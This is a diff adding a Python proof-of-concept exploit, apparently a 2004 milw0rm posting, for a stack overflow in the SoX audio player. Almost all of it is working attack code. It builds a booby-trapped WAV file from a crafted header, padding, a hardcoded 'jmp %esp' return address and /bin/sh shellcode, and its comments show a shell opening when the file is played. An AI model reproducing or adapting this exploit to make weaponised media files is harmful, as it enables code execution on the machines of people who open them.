@@ -1,0 +1,42 @@
+# POC Exploit for SoX Stack Overflow Vulnerability found by Ulf Harnhammar
+# Tested Under Slackware 9.1
+# Serkan Akpolat sakpolat@gmx.net | deicide@siyahsapka.org
+# Homepage: http://deicide.siyahsapka.org
+# Greets to: Virulent
+# deicide@gate:~$ play britney.wav
+# sh-2.05b$
+
+# "jmp %esp" from libc.so , change this if needed..
+retJmpEsp=0x4029824B
+
+# intel_order() from MOSDEF
+def intel_order(myint):
+str=""
+a=chr(myint % 256)
+myint=myint >> 8
+b=chr(myint % 256)
+myint=myint >> 8
+c=chr(myint % 256)
+myint=myint >> 8
+d=chr(myint % 256)
+str+="%c%c%c%c" % (a,b,c,d)
+return str
+
+# Wave Header
+begin = "\x52\x49\x46\x46\x74\x05\x00\x00\x57\x41\x56\x45\x66\x6d\x74\x20" +\
+"\x32\x00\x00\x00\x02\x00\x01\x00\x70\x17\x00\x00\x00\x0c\x00\x00" +\
+"\x00\x01\x04\x00\x20\x00\xf4\x01\x07\x00\x00\x01\x00\x00\x00\x02" +\
+"\x00\xff\x00\x00\x00\x00\xc0\x00\x40\x00\xf0\x00\x00\x00\xcc\x01" +\
+"\x30\xff\x88\x01\x18\xff\x66\x61\x63\x74\x04\x00\x00\x00\x00\x00" +\
+"\x00\x00\x64\x61\x74\x61\x00\x00\x00\x00\x4c\x49\x53\x54\x9a\x01" +\
+"\x00\x00\x49\x4e\x46\x4f\x49\x41\x52\x54\x08\x00\x00\x00\x44\x65" +\
+"\x69\x63\x69\x64\x65\x00\x49\x43\x52\x44\x7e\x01\x00\x00"
+shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+evilBuf = begin+"boom"*75+intel_order(retJmpEsp)+shellcode
+wavFile = open("britney.wav", "wb")
+wavFile.write(evilBuf)
+wavFile.close()
+print "Evil Song has been created :Pp"
+
+# milw0rm.com [2004-08-01]
